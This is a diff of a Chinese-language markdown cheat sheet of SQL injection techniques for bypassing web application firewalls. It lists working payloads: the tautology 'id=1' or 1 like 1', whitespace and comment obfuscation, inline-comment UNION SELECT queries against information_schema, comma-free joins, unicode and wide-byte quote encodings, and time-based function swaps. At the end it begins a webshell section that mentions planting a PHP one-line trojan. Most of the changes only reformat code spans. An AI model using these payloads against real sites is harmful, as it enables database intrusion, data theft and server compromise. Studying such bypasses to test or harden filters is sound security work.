@@ -176,19 +176,19 @@ where table_schema=0xXXXXX
 WAF is a defender for web.  
 繞過手勢:  
 - 萬能密鑰繞過  
-  - ```id=1' or 1 like 1```  
+  - `id=1' or 1 like 1`  
 - 空白繞過  
-  - ```select/**/username/**/from/**/users;```
-  - ```union select 1,2``` -> ```union(select(1),2)```  
-  - ```%20 %09 %0a %0b %0c %0d %a0 /**/```
+  - `select/**/username/**/from/**/users;`
+  - `union select 1,2``` -> ```union(select(1),2)`  
+  - `%20 %09 %0a %0b %0c %0d %a0 /**/`  
 - 大小寫繞過  
-  - ```大小寫混淆 e.g. SelecT```  
+  - `大小寫混淆 e.g. SelecT`  
 - 雙關鍵字繞過  
-  - ```UNIunionON```  
+  - `UNIunionON`  
 - 內聯注釋繞過(**聽說這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個```*/```去閉合多個```/*!```**)  
-  - ```id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE*/+/*!TaBlE_ScHeMa*/+like+database()#```
+  - `id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE*/+/*!TaBlE_ScHeMa*/+like+database()#`  
 - 逗號繞過  
-  - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
+  - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`   
 - 編碼繞過  
   - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
   - `unicode(單引號): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
@@ -199,7 +199,7 @@ WAF is a defender for web.
   - `#`  行內注釋  
   - `--+`   後面的加是空白字元  
   - `/* ... */` 段注釋，可多行  
-  - ``` 特定情況下可作為注釋  mysql <= 5.5  
+  - {反引號} 特定情況下可作為注釋  mysql <= 5.5  
   - `;` stacking queries 一般php+mysql不可行，但是PDO行得通  
 - 命令繞過  
   - `sleep()` -> `benchmark()`  
@@ -208,10 +208,12 @@ WAF is a defender for web.
   - `and/or` -> `&& / |`  
 - 寬字節繞過  
   - 過濾單引號： `%bf%27 %df%27 %aa%27`  
-  - 
 - `information_schema`等關鍵字被禁掉  
   - 爆庫名：`select * from users where name = helloworld();`  
-    原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`
+    原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
+    
+更多的思路：  
+[seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
 ### Webshell
 :racehorse: 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
